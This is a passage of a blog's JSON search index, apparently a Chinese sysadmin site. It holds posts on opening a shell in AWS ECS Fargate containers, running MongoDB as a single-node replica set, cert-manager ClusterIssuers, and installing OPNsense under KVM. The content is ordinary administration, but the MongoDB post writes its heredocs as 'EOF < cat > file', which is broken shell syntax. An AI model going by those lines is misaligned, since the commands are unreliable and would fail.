实际对应的命令如上。其实也可以用aws的cli客户端直接执行，只不过要拿到集群名和容器名。\n","permalink":"https://rendoumi.com/posts/20251110-aws-ecs_fargate/","summary":"\u003cp\u003e公司用到了\u003ccode\u003eAmazon Elastic Container Service\u003c/code\u003e，完全托管的容器服务\u003c/p\u003e\n\u003cp\u003e服务器用的是Fargate，没有自己的服务器，纯托管的，开始部署的时候，也没有考虑到有一天要进入容器进行调试。\u003c/p\u003e\n\u003cp\u003e现在麻烦就来了，需要进入容器，查看文件日志\u003c/p\u003e\n\u003cp\u003e结果就很麻烦，解决的步骤如下：\u003c/p\u003e\n\u003ch5 id=\"一查看集群状态看看任务定义的版本号下面是206\"\u003e一、查看集群状态，看看任务定义的版本号，下面是206\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110091259097\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110091259097.png\"\u003e\u003c/p\u003e\n\u003ch5 id=\"二去到相应的任务定义\"\u003e二、去到相应的任务定义\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110091853031\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110091853031.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注意，现在只有一个任务执行角色，任务角色是个空的！！！\u003c/p\u003e\n\u003cp\u003e然后我们点开任务执行角色，添加权限\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110092123633\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110092123633.png\"\u003e\u003c/p\u003e\n\u003cp\u003e初始化的时候只有\u003ccode\u003eAmazonECSTaskExecutionRolePolicy\u003c/code\u003e, 我们需要加上\u003ccode\u003eAmazonSSMManagedInstanceCore\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e加完就上面一样。\u003c/p\u003e\n\u003ch5 id=\"三返回到任务定义使用json创建新修订\"\u003e三、返回到任务定义，使用JSON创建新修订\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110092432190\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110092432190.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;taskRoleArn\u0026#34;\u003c/span\u003e:      \u003cspan class=\"s2\"\u003e\u0026#34;arn:xxxx:ecsTaskExecutionRole\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;executionRoleArn\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;arn:ecsTaskExecutionRole\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e新增taskRoleArn，和executionRoleArn保持一致，然后保存\u003c/p\u003e\n\u003ch5 id=\"四按照新版本部署新任务\"\u003e四、按照新版本，部署新任务\u003c/h5\u003e\n\u003cp\u003e从新任务定义更新服务\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110100003930\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100003930.png\"\u003e\u003c/p\u003e\n\u003cp\u003e选择相应集群，相应服务\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110100041558\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100041558.png\"\u003e\u003c/p\u003e\n\u003cp\u003e故障排除配置，务必开启ECS exec，然后更新即可\u003cimg alt=\"image-20251110100113356\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100113356.png\"\u003e\u003c/p\u003e\n\u003ch5 id=\"五开启容器的shell\"\u003e五、开启容器的shell\u003c/h5\u003e\n\u003cp\u003e我去集群\u0026ndash;服务\u0026ndash;容器，点击连接\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110100318440\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100318440.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaws ecs execute-command --cluster yoov_work_e_form_prod_cluster --task 23xxxxx --container yontainer --interactive --command \u003cspan class=\"s1\"\u003e\u0026#39;/bin/sh\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e实际对应的命令如上。其实也可以用aws的cli客户端直接执行，只不过要拿到集群名和容器名。\u003c/p\u003e","title":"AWS的ECS使用Fargate服务器如何开启shell进入容器调试"},{"content":"这个话题比较有意思，公司的测试环境本来是一个mongodb的三节点三副本全集群，升级了2次升到8.0。\n结果吧，由于里面数据过于庞大，测试的时候经常把节点打挂，虽说是打挂后又能很快被docker拉起来，但是挂的那个时刻应用程序就掉了，导致测试失败。\n这三台节点还都是8 cpu 32G memory的配置，真大无语了。\n没办法，干脆弄成单节点，然后内存垒高到128G，cpu加到32，弄好之后，读取数据的Flink又不行了，要求是必须读mongo的副本，真完犊子。\n那就强制启动个副本模式吧：\nmongo启动方式用的是docker compose，启动的时候新增参数 --replSet rs0\n# mongo数据目录的属主是 999:999 mkdir -p /data/mongodb/27017/data chown -R 999:999 /data/mongodb/27017/data mkdir -p /data/mongodb/27017/conf/ cd /data/mongodb/27017 #先gen keyfile openssl rand -base64 756 \u0026gt; keyfile chmod 400 keyfile #准备mongod.conf EOF \u0026lt; cat \u0026gt; /data/mongodb/27017/conf/mongod.conf systemLog: destination: file path: \u0026#34;/data/db/mongod.log\u0026#34; logAppend: true net: bindIp: 0.0.0.0 port: 27017 security: keyFile: \u0026#34;/data/configdb/keyfile\u0026#34; EOF EOF \u0026lt; cat \u0026gt; /data/mongodb/docker-compose.yaml services: mongo: container_name: mongo image: mongo:8.0 restart: always environment: TZ: Asia/Shanghai volumes: - /data/mongodb/27017/data:/data/db - /data/mongodb/27017/conf/mongod.conf:/data/configdb/mongod.conf - ./keyfile:/data/configdb/keyfile command: --replSet rs0 --config /data/configdb/mongod.conf ports: - 27017:27017 EOF docker compose up -d 然后不算完啊，启动之后需要进入容器执行rs.initiate(), 放心大胆的执行，不会破坏任何原有的数据\ndocker exec -it mongo sh mongosh use admin db.auth(\u0026#39;root\u0026#39;,\u0026#39;xxxxxxxx\u0026#39;) rs.initiate() Flink就变正常了，可惜然而但是，原有的应用程序就突然不行了，报无法连接mongo！\n那原有的连接字串需要变一下：\nmongodb://root:xxxxxxxx@192.168.1.20/?authSource=admin\u0026amp;directConnection=true\u0026amp;tls=false 真的是麻烦的一匹！！！\n","permalink":"https://rendoumi.com/posts/20251029-mongodb-rs0/","summary":"\u003cp\u003e这个话题比较有意思，公司的测试环境本来是一个mongodb的三节点三副本全集群，升级了2次升到8.0。\u003c/p\u003e\n\u003cp\u003e结果吧，由于里面数据过于庞大，测试的时候经常把节点打挂，虽说是打挂后又能很快被docker拉起来，但是挂的那个时刻应用程序就掉了，导致测试失败。\u003c/p\u003e\n\u003cp\u003e这三台节点还都是8 cpu 32G memory的配置，真大无语了。\u003c/p\u003e\n\u003cp\u003e没办法，干脆弄成单节点，然后内存垒高到128G，cpu加到32，弄好之后，读取数据的\u003ccode\u003eFlink\u003c/code\u003e又不行了，要求是必须读mongo的副本，真完犊子。\u003c/p\u003e\n\u003cp\u003e那就强制启动个副本模式吧：\u003c/p\u003e\n\u003cp\u003emongo启动方式用的是docker compose，启动的时候新增参数 \u003ccode\u003e--replSet rs0\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# mongo数据目录的属主是 999:999\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/mongodb/27017/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown -R 999:999 /data/mongodb/27017/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/mongodb/27017/conf/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /data/mongodb/27017\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#先gen keyfile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl rand -base64 \u003cspan class=\"m\"\u003e756\u003c/span\u003e \u0026gt; keyfile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e400\u003c/span\u003e keyfile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#准备mongod.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF \u0026lt; cat \u0026gt; /data/mongodb/27017/conf/mongod.conf \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemLog:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   destination: file\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   path: \u003cspan class=\"s2\"\u003e\u0026#34;/data/db/mongod.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   logAppend: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   bindIp: 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   port: \u003cspan class=\"m\"\u003e27017\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esecurity:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   keyFile: \u003cspan class=\"s2\"\u003e\u0026#34;/data/configdb/keyfile\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF \u0026lt; cat \u0026gt; /data/mongodb/docker-compose.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  mongo:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: mongo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: mongo:8.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: always\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      TZ: Asia/Shanghai\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - /data/mongodb/27017/data:/data/db\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - /data/mongodb/27017/conf/mongod.conf:/data/configdb/mongod.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./keyfile:/data/configdb/keyfile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: --replSet rs0 --config /data/configdb/mongod.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 27017:27017\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker compose up -d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后不算完啊，启动之后需要进入容器执行\u003ccode\u003ers.initiate()\u003c/code\u003e, 放心大胆的执行，不会破坏任何原有的数据\u003c/p\u003e","title":"MongoDB的伪副本模式"},{"content":"cert-manager普通签发证书的时候，通常是DNS的A记录已经解析到相关的Ingress前置的LB 公网IP了。\n第一种情况，有公网IP的证书签发，验证方式是http 那准备好cluster-issuer.yaml\napiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-prod1 spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: zhangranrui@rendoumi.com privateKeySecretRef: name: letsencrypt-prod1 solvers: - http01: ingress: class: nginx 第二种情况，如果集群是部署在内网，根本没有公网ip，就不能通过80和443的验证来签发了，只能用DNS校验的方式来签发证书 那以cloudflare托管的DNS为例，我们需要拿到CF的dns-api的token，然后声明，再定义ClusterIssuer\n--- apiVersion: v1 kind: Secret metadata: name: cloudflare-api-token-secret type: Opaque stringData: api-token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx --- apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-prod2 spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: zhangranrui@rendoumi.com privateKeySecretRef: name: letsencrypt-prod2 solvers: - dns01: cloudflare: email: zhangranrui@rendoumi.com apiTokenSecretRef: name: cloudflare-api-token-secret key: api-token 那第一种和第二种的区别就是solvers是不同的。\n那最后annouce ingress即可自动签发证书，选择不同cert-manager.io/cluster-issuer就可以选择不同的签发方式。\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: test-rednoumi-com-ingress annotations: cert-manager.io/cluster-issuer: \u0026#34;letsencrypt-prod1\u0026#34; spec: ingressClassName: nginx tls: - hosts: - test.rendoumi.com secretName: test-rendoumi-com-tls rules: - host: test.rendoumi.com http: paths: - path: / pathType: Prefix backend: service: name: nginx port: number: 80 ","permalink":"https://rendoumi.com/posts/20251024-certmanager_issuer/","summary":"\u003cp\u003ecert-manager普通签发证书的时候，通常是DNS的A记录已经解析到相关的Ingress前置的LB 公网IP了。\u003c/p\u003e\n\u003ch5 id=\"第一种情况有公网ip的证书签发验证方式是http\"\u003e第一种情况，有公网IP的证书签发，验证方式是http\u003c/h5\u003e\n\u003cp\u003e那准备好cluster-issuer.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: cert-manager.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ClusterIssuer\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: letsencrypt-prod1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  acme:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server: https://acme-v02.api.letsencrypt.org/directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    email: zhangranrui@rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    privateKeySecretRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      name: letsencrypt-prod1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    solvers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - http01:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ingress:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          class: nginx\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"第二种情况如果集群是部署在内网根本没有公网ip就不能通过80和443的验证来签发了只能用dns校验的方式来签发证书\"\u003e第二种情况，如果集群是部署在内网，根本没有公网ip，就不能通过80和443的验证来签发了，只能用DNS校验的方式来签发证书\u003c/h5\u003e\n\u003cp\u003e那以cloudflare托管的DNS为例，我们需要拿到CF的dns-api的token，然后声明，再定义ClusterIssuer\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: Secret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: cloudflare-api-token-secret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etype: Opaque\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estringData:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  api-token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: cert-manager.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ClusterIssuer\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: letsencrypt-prod2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  acme:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server: https://acme-v02.api.letsencrypt.org/directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    email: zhangranrui@rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    privateKeySecretRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      name: letsencrypt-prod2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    solvers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - dns01:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        cloudflare:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          email: zhangranrui@rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          apiTokenSecretRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            name: cloudflare-api-token-secret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            key: api-token\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那第一种和第二种的区别就是solvers是不同的。\u003c/p\u003e","title":"cert-manager的不同clusterissuer验证方式"},{"content":"OPNsense安装其实很容易，但是远程装就不那么好玩了。\n尤其涉及到内网WEBGUI的访问，缺省安装完成以后，只能从内网口访问管理界面，问题是VPC里只有一台Linux机器，还没有浏览器，怎么办？\n记录一下安装过程，备查：\n一、下载iso镜像并解压 wget https://pkg.opnsense.org/releases/25.7/OPNsense-25.7-dvd-amd64.iso.bz2 bzip2 -d OPNsense-25.7-dvd-amd64.iso.bz2 二、kvm用virt-install安装iso，注意桥接了2个网卡 #!/bin/bash mkdir -p /export/kvm/opn/ qemu-img create -f qcow2 /export/kvm/opn/opn.qcow2 20G virt-install \\ --name=opn \\ --vcpu=2 \\ --ram=2048 \\ --disk path=/export/kvm/opn/opn.qcow2,format=qcow2,size=20 \\ --cdrom=/export/kvm/iso/OPNsense-25.7-dvd-amd64.iso \\ --network bridge=br0,model=virtio \\ --network bridge=br1,model=virtio \\ --os-type unix \\ --os-variant freebsd13.1 \\ --vnc --vnclisten=0.0.0.0 --vncport=5901 三、vnc连到port 5901上进行安装配置 OPNsense公网的网卡、ip、mask、gateway配置\nOPNsense内网的网卡、ip、mask配置\n四、设置内网访问 这里就非常鬼畜了，首先在内网的那台机器上做port转发，这台机器是192.168.100.2，做个systemd的service:\ncat /etc/systemd/system/opn-proxy.service [Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/usr/local/bin/ Type=simple ExecStart=/usr/local/bin/go-tcp-proxy_1.0.2_linux_amd64 -l \u0026#34;:4430\u0026#34; -r \u0026#34;192.168.100.1:4430\u0026#34; Restart=on-failure RestartSec=1s [Install] WantedBy=multi-user.target 如上的话，如果web访问http://192.168.100.2:4430，那Host: 192.168.100.1 会被转发给 192.168.100.1 的OPNsense的4430端口\n那OPNsense的内网IP是192.168.100.1，登录用户是root，密码是xxxxxxxx\n从vnc上登录，然后进入shell，找到webgui的部分，添加port和althostnames的两项\nvi /conf/config.xml ...... \u0026lt;webgui\u0026gt; \u0026lt;protocol\u0026gt;https\u0026lt;/protocol\u0026gt; \u0026lt;ssl-certref\u0026gt;68adc26101eeb\u0026lt;/ssl-certref\u0026gt; \u0026lt;port\u0026gt;4430\u0026lt;/port\u0026gt; \u0026lt;althostnames\u0026gt;192.168.100.2\u0026lt;/althostnames\u0026gt; \u0026lt;/webgui\u0026gt; ...... 然后重启webgui\nconfigctl webgui restart 然后就可以从能访问到 192.168.100.2:4430 的机器去访问OPNsense的管理界面了。\n","permalink":"https://rendoumi.com/posts/20251023-opnsense_install/","summary":"\u003cp\u003eOPNsense安装其实很容易，但是远程装就不那么好玩了。\u003c/p\u003e\n\u003cp\u003e尤其涉及到内网WEBGUI的访问，缺省安装完成以后，只能从内网口访问管理界面，问题是VPC里只有一台Linux机器，还没有浏览器，怎么办？\u003c/p\u003e\n\u003cp\u003e记录一下安装过程，备查：\u003c/p\u003e\n\u003ch5 id=\"一下载iso镜像并解压\"\u003e一、下载iso镜像并解压\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://pkg.opnsense.org/releases/25.7/OPNsense-25.7-dvd-amd64.iso.bz2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebzip2 -d OPNsense-25.7-dvd-amd64.iso.bz2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"二kvm用virt-install安装iso注意桥接了2个网卡\"\u003e二、kvm用virt-install安装iso，注意桥接了2个网卡\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003emkdir -p /export/kvm/opn/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 /export/kvm/opn/opn.qcow2 20G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003eopn \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2048\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/opn/opn.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20\u003c/span\u003e \u003cspan 